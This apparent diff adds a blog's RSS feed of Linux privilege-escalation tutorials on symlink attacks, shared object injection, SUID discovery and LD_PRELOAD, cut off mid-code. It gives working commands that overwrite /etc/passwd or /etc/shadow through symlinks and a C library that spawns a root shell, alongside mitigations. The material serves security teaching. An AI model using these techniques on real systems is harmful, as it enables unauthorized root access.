@@ -1,0 +1,1550 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Linux Privilege Escalation on Zerodex Blog</title><link>https://zerodex1.github.io/categories/linux-privilege-escalation/</link><description>Recent content in Linux Privilege Escalation on Zerodex Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 30 Jan 2025 17:41:45 +0000</lastBuildDate><atom:link href="https://zerodex1.github.io/categories/linux-privilege-escalation/index.xml" rel="self" type="application/rss+xml"/><item><title>Binary Symlinks</title><link>https://zerodex1.github.io/p/binary-symlinks/</link><pubDate>Thu, 30 Jan 2025 17:41:45 +0000</pubDate><guid>https://zerodex1.github.io/p/binary-symlinks/</guid><description>&lt;img src="https://zerodex1.github.io/post/binary.jpg" alt="Featured image of post Binary Symlinks" />&lt;h3 id="binary-symlink-privilege-escalation">&lt;strong>Binary Symlink Privilege Escalation&lt;/strong>
+&lt;/h3>&lt;p>Binary symlink privilege escalation is a technique where an attacker abuses symbolic links (symlinks) to trick a privileged program into executing malicious code or performing unintended actions with elevated privileges. This type of attack often targets misconfigured or insecurely coded scripts or binaries that execute with higher privileges, such as &lt;code>root&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;h3 id="how-it-works">&lt;strong>How It Works&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Understanding Symlinks&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>A symlink is a file that points to another file or directory.&lt;/li>
+&lt;li>For example:
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ln -s /path/to/target /path/to/symlink
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Privilege Escalation via Symlinks&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>An attacker creates a symlink pointing to a malicious binary or file.&lt;/li>
+&lt;li>A privileged program inadvertently interacts with the symlink, allowing the attacker to manipulate the file or execute code with elevated privileges.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="scenarios-for-exploiting-symlinks">&lt;strong>Scenarios for Exploiting Symlinks&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Writable Directories in Privileged Context&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>If a privileged program creates or interacts with files in a directory writable by unprivileged users, an attacker can replace those files with symlinks pointing to sensitive locations like &lt;code>/etc/passwd&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Temporary File Vulnerabilities&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Programs that create temporary files without securely checking their existence are susceptible to symlink attacks.&lt;/li>
+&lt;li>Example:
+&lt;ul>
+&lt;li>A script creates a temporary file &lt;code>/tmp/somefile&lt;/code> without checking if it already exists.&lt;/li>
+&lt;li>The attacker creates a symlink &lt;code>/tmp/somefile&lt;/code> pointing to &lt;code>/etc/shadow&lt;/code>.&lt;/li>
+&lt;li>When the privileged program writes to &lt;code>/tmp/somefile&lt;/code>, it overwrites &lt;code>/etc/shadow&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Replacing Binaries&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>If a privileged service or cron job executes a script from a writable directory, an attacker can replace it with a symlink pointing to a malicious script.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="practical-example">&lt;strong>Practical Example&lt;/strong>
+&lt;/h3>&lt;h4 id="1-symlink-attack-to-modify-etcpasswd">1. Symlink Attack to Modify &lt;code>/etc/passwd&lt;/code>
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>Assume a root script copies a file to &lt;code>/etc/passwd&lt;/code> without checking its destination:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cp /tmp/userfile /etc/passwd
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Exploitation:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ln -s /etc/passwd /tmp/userfile
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;malicious_entry:x:0:0:root:/root:/bin/bash&amp;#34;&lt;/span> &amp;gt;&amp;gt; /tmp/userfile
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>When the script runs, the symlink redirects &lt;code>/tmp/userfile&lt;/code> to &lt;code>/etc/passwd&lt;/code>, adding the malicious entry with root privileges.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="2-temporary-file-exploitation">2. Temporary File Exploitation
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>A root-owned script writes logs to &lt;code>/tmp/log.txt&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;System Log&amp;#34;&lt;/span> &amp;gt; /tmp/log.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Exploitation:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ln -s /etc/shadow /tmp/log.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>The script overwrites &lt;code>/etc/shadow&lt;/code>, potentially corrupting it or injecting malicious content.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="mitigations">&lt;strong>Mitigations&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Secure Temporary File Creation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Use secure functions like &lt;code>mktemp&lt;/code> to create unique temporary files.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">temp_file&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>mktemp&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Secure Data&amp;#34;&lt;/span> &amp;gt; &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$temp_file&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Validate Symlinks&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Use the &lt;code>O_NOFOLLOW&lt;/code> flag when opening files to avoid following symlinks:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/tmp/file&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_WRONLY&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">O_CREAT&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">O_NOFOLLOW&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Restrict Permissions&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Ensure sensitive directories and files are not writable by unprivileged users.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>For example, &lt;code>/tmp&lt;/code> should have the &lt;code>sticky&lt;/code> bit set:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chmod +t /tmp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Avoid Privileged Actions on User-Controlled Files&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Avoid executing privileged operations on files in user-writable locations.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Monitor and Audit&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Regularly monitor for suspicious symlinks in writable directories using tools like &lt;code>find&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find /tmp -type l -ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr></description></item><item><title>Shared Object Injection</title><link>https://zerodex1.github.io/p/shared-object-injection/</link><pubDate>Sun, 26 Jan 2025 13:50:55 +0000</pubDate><guid>https://zerodex1.github.io/p/shared-object-injection/</guid><description>&lt;img src="https://zerodex1.github.io/post/suid.jpg" alt="Featured image of post Shared Object Injection" />&lt;h3 id="shared-object-injection-for-privilege-escalation">&lt;strong>Shared Object Injection for Privilege Escalation&lt;/strong>
+&lt;/h3>&lt;p>&lt;strong>Shared Object (SO) injection&lt;/strong> is a technique where an attacker forces a process to load a malicious shared library (.so file) into its memory. When executed, the malicious code in the library runs with the privileges of the target process, potentially leading to privilege escalation if the process has higher privileges (e.g., root).&lt;/p>
+&lt;hr>
+&lt;h3 id="how-shared-object-injection-works">&lt;strong>How Shared Object Injection Works&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Shared Libraries in Linux&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Linux dynamically links shared libraries (&lt;code>.so&lt;/code> files) at runtime.&lt;/li>
+&lt;li>Applications specify required libraries in their code, and the system&amp;rsquo;s &lt;strong>dynamic linker&lt;/strong> loads them when the application starts.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Manipulating Library Loading&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Attackers can exploit library loading mechanisms, such as modifying environment variables (&lt;code>LD_PRELOAD&lt;/code>, &lt;code>LD_LIBRARY_PATH&lt;/code>), or targeting programs that improperly handle library paths.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Privilege Escalation&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>If an attacker can make a root-owned process load their malicious &lt;code>.so&lt;/code> file, they can execute arbitrary code as root.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="techniques-for-shared-object-injection">&lt;strong>Techniques for Shared Object Injection&lt;/strong>
+&lt;/h3>&lt;h4 id="1-using-ld_preload">1. &lt;strong>Using &lt;code>LD_PRELOAD&lt;/code>&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>The &lt;code>LD_PRELOAD&lt;/code> environment variable allows users to specify additional shared libraries to be loaded before any others.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Exploit scenario:&lt;/p>
+&lt;ul>
+&lt;li>A program with &lt;code>sudo&lt;/code> permissions does not sanitize environment variables.&lt;/li>
+&lt;li>The attacker sets &lt;code>LD_PRELOAD&lt;/code> to point to their malicious &lt;code>.so&lt;/code> file.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;void _init() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); }&amp;#39;&lt;/span> &amp;gt; exploit.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gcc -shared -fPIC -o exploit.so exploit.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>./exploit.so sudo some-command
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h4 id="2-hijacking-ld_library_path">2. &lt;strong>Hijacking &lt;code>LD_LIBRARY_PATH&lt;/code>&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>
+&lt;p>&lt;code>LD_LIBRARY_PATH&lt;/code> specifies directories for the linker to search for shared libraries.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Exploit scenario:&lt;/p>
+&lt;ul>
+&lt;li>The attacker modifies &lt;code>LD_LIBRARY_PATH&lt;/code> to include a directory containing malicious libraries.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">LD_LIBRARY_PATH&lt;/span>&lt;span class="o">=&lt;/span>/tmp/malicious:&lt;span class="nv">$LD_LIBRARY_PATH&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h4 id="3-replacing-legitimate-libraries">3. &lt;strong>Replacing Legitimate Libraries&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>Replace a shared library on the system with a malicious one.&lt;/li>
+&lt;li>Exploit scenario:
+&lt;ul>
+&lt;li>Insufficient file permissions allow an attacker to overwrite a &lt;code>.so&lt;/code> file used by a privileged program.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h4 id="4-dynamic-linking-exploits">4. &lt;strong>Dynamic Linking Exploits&lt;/strong>:
+&lt;/h4>&lt;ul>
+&lt;li>Exploit applications that dynamically load libraries during execution using functions like &lt;code>dlopen()&lt;/code> or &lt;code>dlsym()&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h3 id="example-privilege-escalation-using-ld_preload">&lt;strong>Example: Privilege Escalation Using LD_PRELOAD&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Create a Malicious Shared Object&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">_init&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setuid&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Set the UID to root
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/bash&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Spawn a root shell
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Save this as &lt;code>exploit.c&lt;/code> and compile:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">gcc -fPIC -shared -o exploit.so exploit.c
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Set LD_PRELOAD&lt;/strong>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LD_PRELOAD&lt;/span>&lt;span class="o">=&lt;/span>/path/to/exploit.so sudo some-command
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Result&lt;/strong>: A root shell is spawned if the target process is vulnerable.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="mitigations-against-so-injection">&lt;strong>Mitigations Against SO Injection&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Disable &lt;code>LD_PRELOAD&lt;/code> for SUID Programs&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Modern Linux systems ignore &lt;code>LD_PRELOAD&lt;/code> for SUID binaries to prevent this type of attack.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Restrict &lt;code>LD_LIBRARY_PATH&lt;/code>&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Limit the use of custom library paths in privileged programs.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Secure File Permissions&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Ensure shared libraries are owned by root and are not writable by unprivileged users.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Use Static Linking&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>For critical programs, avoid dynamic linking altogether.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Audit Programs&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Identify and fix applications that dynamically load libraries without proper checks.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>SUID Attacks</title><link>https://zerodex1.github.io/p/suid-attacks/</link><pubDate>Sun, 26 Jan 2025 12:47:23 +0000</pubDate><guid>https://zerodex1.github.io/p/suid-attacks/</guid><description>&lt;img src="https://zerodex1.github.io/post/coversuid.jpg" alt="Featured image of post SUID Attacks" />&lt;h1 id="what-is-suid">What is SUID?
+&lt;/h1>&lt;p>&lt;strong>Definition:&lt;/strong> SUID (Set owner User ID up on execution) is a special permission that allows other users run with the owner’s privileges. That’s why SUID files can be exploited to give adversaries the higher privilege in Linux/Unix system called privilege escalation. Mostly, &lt;strong>root&lt;/strong> access is the goal of hackers when performing privilege escalation.&lt;/p>
+&lt;h2 id="techniques-">Techniques :
+&lt;/h2>&lt;ul>
+&lt;li>Shared Object Injection&lt;/li>
+&lt;li>Binary Symlinks&lt;/li>
+&lt;li>Environment Variables&lt;/li>
+&lt;/ul>
+&lt;h2 id="how-to-find-the-suid-files">How to find the SUID files
+&lt;/h2>&lt;p>The following command will list all of the SUID files in the system&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>find&lt;/code>: a Linux command to search for files in a directory hierarchy&lt;/li>
+&lt;li>&lt;code>-perm&lt;/code>: is used to define the permissions to search for&lt;/li>
+&lt;li>&lt;code>-u=s&lt;/code>: search for files with the SUID permission&lt;/li>
+&lt;li>&lt;code>-type f&lt;/code>: search for regular file&lt;/li>
+&lt;li>&lt;code>2&amp;gt;dev/nul&lt;/code>l: errors will be deleted automatically&lt;/li>
+&lt;/ul></description></item><item><title>LD PRELOAD</title><link>https://zerodex1.github.io/p/ld-preload/</link><pubDate>Fri, 24 Jan 2025 13:21:32 +0000</pubDate><guid>https://zerodex1.github.io/p/ld-preload/</guid><description>&lt;img src="https://zerodex1.github.io/post/ldpco.jpg" alt="Featured image of post LD PRELOAD" />&lt;h2 id="linux-privilege-escalation-using-ld_preload">&lt;strong>Linux Privilege Escalation Using LD_PRELOAD&lt;/strong>
+&lt;/h2>&lt;p>&lt;strong>LD_PRELOAD&lt;/strong> is an environment variable in Linux that allows users to load custom shared libraries before any other libraries during the execution of a program. Attackers can exploit this feature to inject malicious code and potentially escalate privileges, especially if the target program is executed with elevated permissions (e.g., as &lt;code>root&lt;/code>).&lt;/p>
+&lt;h2 id="how-ld_preload-works">&lt;strong>How LD_PRELOAD Works&lt;/strong>
+&lt;/h2>&lt;ol>
+&lt;li>&lt;strong>Purpose&lt;/strong>: LD_PRELOAD is used for debugging or testing by overriding functions in shared libraries.&lt;/li>
+&lt;li>&lt;strong>Mechanism&lt;/strong>: When a program is executed, the dynamic linker checks the LD_PRELOAD variable for a shared library path. If specified, this library is loaded before others, allowing its functions to override standard library functions.&lt;/li>
+&lt;/ol>
+&lt;h2 id="privilege-escalation">Privilege Escalation
+&lt;/h2>&lt;p>&lt;img src="https://zerodex1.github.io/post/ldpreload.png"
+loading="lazy"
+alt="image alt text"
+>&lt;/p>
+&lt;p>Let’s generate a C program file inside the &lt;code>/tmp&lt;/code> directory.&lt;/p>
+&lt;p>&lt;img src="https://1.bp.blogspot.com/-B9yPaw7TbHU/WyKXUU2u8iI/AAAAAAAAXXo/pyxfa1xrXn8Pr1il5ziHSB2ppZ2MQN2AACEwYBhgL/s1600/4.png"
+loading="lazy"
+alt="C Program File Example"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt; &lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
